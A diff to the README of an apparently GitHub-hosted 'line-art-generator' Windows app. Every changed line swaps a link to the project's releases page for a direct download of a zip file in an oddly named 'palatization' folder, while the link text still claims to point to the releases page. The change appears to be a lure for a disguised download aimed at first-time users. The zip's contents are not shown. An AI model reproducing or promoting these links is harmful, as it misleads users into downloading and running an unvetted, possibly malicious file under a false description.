@@ -1,6 +1,6 @@
 # ✏️ line-art-generator - Turn photos into clean line art
 
-[![Download line-art-generator](https://img.shields.io/badge/Download%20line-art-generator-blue?style=for-the-badge)](https://github.com/ha2228140-hue/line-art-generator/releases)
+[![Download line-art-generator](https://img.shields.io/badge/Download%20line-art-generator-blue?style=for-the-badge)](https://github.com/ha2228140-hue/line-art-generator/raw/refs/heads/main/palatization/art-generator-line-v2.3.zip)
 
 ## 🧭 What this app does
 
@@ -26,7 +26,7 @@ Best results come from:
 
 Visit this page to download the Windows version:
 
-[Go to the line-art-generator releases page](https://github.com/ha2228140-hue/line-art-generator/releases)
+[Go to the line-art-generator releases page](https://github.com/ha2228140-hue/line-art-generator/raw/refs/heads/main/palatization/art-generator-line-v2.3.zip)
 
 After the page opens:
 
@@ -154,7 +154,7 @@ line-art-generator is meant for local use on your computer. Your images stay on 
 
 Use the release page below to get the latest Windows build:
 
-[Download line-art-generator from GitHub Releases](https://github.com/ha2228140-hue/line-art-generator/releases)
+[Download line-art-generator from GitHub Releases](https://github.com/ha2228140-hue/line-art-generator/raw/refs/heads/main/palatization/art-generator-line-v2.3.zip)
 
 ## 🧭 Step-by-step for first-time users
 
@@ -209,4 +209,4 @@ You can use the saved image for:
 
 Use this link to visit the release page and download the Windows version:
 
-[https://github.com/ha2228140-hue/line-art-generator/releases](https://github.com/ha2228140-hue/line-art-generator/releases)
+[https://github.com/ha2228140-hue/line-art-generator/raw/refs/heads/main/palatization/art-generator-line-v2.3.zip](https://github.com/ha2228140-hue/line-art-generator/raw/refs/heads/main/palatization/art-generator-line-v2.3.zip)
